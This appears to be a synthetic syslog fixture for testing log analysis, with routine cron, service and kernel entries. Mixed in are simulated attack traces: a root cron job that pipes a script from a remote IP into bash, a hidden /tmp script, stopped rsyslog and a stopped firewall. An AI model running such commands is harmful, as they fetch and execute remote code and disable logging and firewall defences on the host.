# Sample syslog -- representative system log for testing
# Simulates: cron activity, service changes, kernel error, log tampering attempt

Jan 15 08:00:01 webserver CRON[1100]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
Jan 15 08:05:00 webserver CRON[1101]: (deploy) CMD (/usr/bin/python3 /opt/app/backup.py)
Jan 15 08:30:00 webserver systemd[1]: Started Session 1 of user admin.
Jan 15 09:00:00 webserver systemd[1]: Starting nginx.service - A high performance web server
Jan 15 09:00:01 webserver systemd[1]: Started nginx.service - A high performance web server
Jan 15 09:01:15 webserver CRON[2200]: (root) CMD (/bin/bash /tmp/.hidden_script.sh)
Jan 15 09:05:12 webserver systemd[1]: Started Session 45 of user root.
Jan 15 09:09:55 webserver CRON[2300]: (root) CMD (curl http://203.0.113.50/payload.sh | bash)
Jan 15 09:10:00 webserver systemd[1]: Stopping rsyslog.service - System Logging Service
Jan 15 09:10:01 webserver systemd[1]: Stopped rsyslog.service - System Logging Service
Jan 15 09:10:02 webserver systemd[1]: rsyslog.service: Stopping due to: SIGTERM signal
Jan 15 09:15:00 webserver kernel: [12345.678901] EXT4-fs error (device sda1): ext4_journal_check_start
Jan 15 09:15:01 webserver kernel: [12345.678902] EXT4-fs error (device sda1): journal not started
Jan 15 09:16:00 webserver CRON[2400]: (www-data) CMD (/usr/lib/cgi-bin/stats.py)
Jan 15 09:20:00 webserver systemd[1]: systemd-journald.service: Main process exited
Jan 15 09:25:00 webserver kernel: [12500.001001] general protection fault: 0000 [#1] SMP
Jan 15 09:25:01 webserver kernel: [12500.001002] Call Trace:
Jan 15 09:25:02 webserver kernel: [12500.001003] [<ffffffff81234567>] do_page_fault+0x1a/0x70
Jan 15 09:30:00 webserver CRON[3100]: (root) CMD (cd / && run-parts --report /etc/cron.daily)
Jan 15 10:00:00 webserver systemd[1]: Starting fail2ban.service - Fail2Ban Service
Jan 15 10:00:01 webserver systemd[1]: Started fail2ban.service - Fail2Ban Service
Jan 15 10:05:00 webserver systemd[1]: systemctl stop ufw
Jan 15 10:30:00 webserver CRON[4100]: (backup) CMD (/usr/local/bin/backup_db.sh)
Jan 15 10:31:00 webserver systemd[1]: Started Session 50 of user deploy.
Jan 15 11:00:00 webserver CRON[5100]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
